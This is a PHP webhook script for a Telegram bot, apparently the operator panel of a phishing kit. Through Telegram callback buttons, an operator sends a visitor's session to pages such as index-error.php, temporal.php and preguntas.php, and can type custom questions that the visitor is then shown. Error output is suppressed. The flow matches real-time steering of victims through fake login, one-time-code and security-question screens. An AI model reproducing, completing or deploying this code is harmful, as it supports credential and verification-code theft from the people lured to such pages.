<?php
require_once 'config.php';

// Ocultar errores
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// === 1. MODO MANUAL ===
if (isset($_GET['session_id']) && isset($_GET['page'])) {
    $session_id = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['session_id']);
    $page = basename($_GET['page']);

    session_write_close();
    session_id($session_id);
    session_start();
    $_SESSION['redirect'] = $page;
    $_SESSION['redirect_set_time'] = time();
    session_write_close();

    echo json_encode(['status' => 'success', 'message' => "Redirigiendo a $page"]);
    exit;
}

// === 2. MODO AUTOMÁTICO (Callback Query) ===
$input = file_get_contents("php://input");
$update = json_decode($input, true);

// ✅ Detectar qué bot recibió el webhook
$current_bot_token = null;

$current_chat_id =
    $update['callback_query']['message']['chat']['id']
    ?? $update['message']['chat']['id']
    ?? null;

if ($current_chat_id) {

    foreach ($telegram_accounts as $account) {

        if ($account['chat_id'] == $current_chat_id) {
            $current_bot_token = $account['token'];
            break;
        }
    }
}

if (!$current_bot_token) {
    exit;
}

if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data = trim($callback_query['data']);
    $chat_id = $callback_query['message']['chat']['id'];

    // --- Redirección normal
    if (strpos($callback_data, 'redir:') === 0) {
        $parts = explode(":", $callback_data);

        if (count($parts) === 3) {

            $session_id = preg_replace('/[^a-zA-Z0-9]/', '', $parts[1]);
            $redirect_page = basename($parts[2]);

            $valid_pages = [
                'index.php',
                'index-error.php',
                'temporal.php',
                'temporal-error.php',
                'finalizar.php',
                'preguntas.php',
                'preguntas-error.php'
            ];

            if (!in_array($redirect_page, $valid_pages)) {
                exit;
            }

            session_write_close();
            session_id($session_id);
            session_start();

            // ✅ Mantener el mismo ID
            if (
                in_array(
                    $redirect_page,
                    [
                        'preguntas.php',
                        'preguntas-error.php',
                        'temporal.php',
                        'temporal-error.php'
                    ]
                )
            ) {
                $_SESSION['redirect'] = $redirect_page . "?id=" . $session_id;
            } else {
                $_SESSION['redirect'] = $redirect_page;
            }

            $_SESSION['redirect_set_time'] = time();

            session_write_close();

            answerCallbackQuery(
                $callback_query['id'],
                "✅ Redirigiendo a $redirect_page"
            );
        }
    }

    // --- Personalizar Preguntas
    if (strpos($callback_data, 'custom:') === 0) {

        $session_id = preg_replace(
            '/[^a-zA-Z0-9]/',
            '',
            explode(":", $callback_data)[1]
        );

        $file = __DIR__ . "/requests/$session_id.json";

        // Cargar datos existentes
        $data = file_exists($file)
            ? json_decode(file_get_contents($file), true)
            : [];

        $data['step'] = 'awaiting_q1';
        $data['chat_id'] = $chat_id;

        // Enviar mensaje
        $sent = sendTelegramMessage(
            $chat_id,
            "✍️ *Escribe la primera pregunta personalizada:*"
        );

        if (isset($sent['result']['message_id'])) {
            $data['msg_q1'] = $sent['result']['message_id'];
        }

        file_put_contents(
            $file,
            json_encode($data, JSON_UNESCAPED_UNICODE)
        );

        session_write_close();
        session_id($session_id);
        session_start();

        $_SESSION['redirect'] = "preguntas.php?id=$session_id";
        $_SESSION['wait_for_questions'] = true;

        session_write_close();

        answerCallbackQuery(
            $callback_query['id'],
            "Redirigiendo a preguntas.php..."
        );
    }
}

// === 3. RESPUESTAS A PREGUNTAS PERSONALIZADAS ===
if (isset($update['message']['text'])) {

    $chat_id = $update['message']['chat']['id'];
    $text = trim($update['message']['text']);
    $message_id = $update['message']['message_id'];

    // Borrar mensajes del propio bot
    $from = $update['message']['from'];

    if (
        isset($from['is_bot']) &&
        $from['is_bot'] === true &&
        isset($from['username']) &&
        strtolower($from['username']) === '@cid_bot'
    ) {
        deleteMessage($chat_id, $message_id);
        exit;
    }

    foreach (glob(__DIR__ . "/requests/*.json") as $file) {

        $data = json_decode(file_get_contents($file), true);

        if (
            !isset($data['chat_id']) ||
            $data['chat_id'] != $chat_id
        ) {
            continue;
        }

        $session_id = basename($file, ".json");

        if (($data['step'] ?? '') === 'awaiting_q1') {

            $data['question1'] = $text;
            $data['step'] = 'awaiting_q2';

            // Borrar mensaje anterior
            if (!empty($data['msg_q1'])) {
                deleteMessage($chat_id, $data['msg_q1']);
                unset($data['msg_q1']);
            }

            // Pregunta 2
            $sent = sendTelegramMessage(
                $chat_id,
                "✍️ *Ahora escribe la segunda pregunta personalizada:*"
            );

            if (isset($sent['result']['message_id'])) {
                $data['msg_q2'] = $sent['result']['message_id'];
            }

            file_put_contents(
                $file,
                json_encode($data, JSON_UNESCAPED_UNICODE)
            );

            break;

        } elseif (($data['step'] ?? '') === 'awaiting_q2') {

            $data['question2'] = $text;

            unset($data['step']);

            $data['redirect'] = 'preguntas.php';

            session_write_close();
            session_id($session_id);
            session_start();

            $_SESSION['redirect'] = "preguntas.php?id=$session_id";
            $_SESSION['redirect_set_time'] = time();

            session_write_close();

            // Borrar mensaje anterior
            if (!empty($data['msg_q2'])) {
                deleteMessage($chat_id, $data['msg_q2']);
                unset($data['msg_q2']);
            }

            file_put_contents(
                $file,
                json_encode($data, JSON_UNESCAPED_UNICODE)
            );

            sendTelegramMessage(
                $chat_id,
                "✅ Preguntas guardadas y usuario redirigido."
            );

            break;
        }
    }
}

// === FUNCIONES ===

function sendTelegramMessage($chat_id, $text) {

    global $current_bot_token;

    $url = "https://api.telegram.org/bot$current_bot_token/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];

    return sendTelegramRequest($url, $data);
}

function answerCallbackQuery($callback_id, $text) {

    global $current_bot_token;

    $url = "https://api.telegram.org/bot$current_bot_token/answerCallbackQuery";

    $data = [
        'callback_query_id' => $callback_id,
        'text' => $text,
        'show_alert' => false
    ];

    sendTelegramRequest($url, $data);
}

function deleteMessage($chat_id, $message_id) {

    global $current_bot_token;

    $url = "https://api.telegram.org/bot$current_bot_token/deleteMessage";

    $data = [
        'chat_id' => $chat_id,
        'message_id' => $message_id
    ];

    sendTelegramRequest($url, $data);
}

function sendTelegramRequest($url, $data) {

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $resp = @curl_exec($ch);

    curl_close($ch);

    return json_decode($resp, true);
}
?>
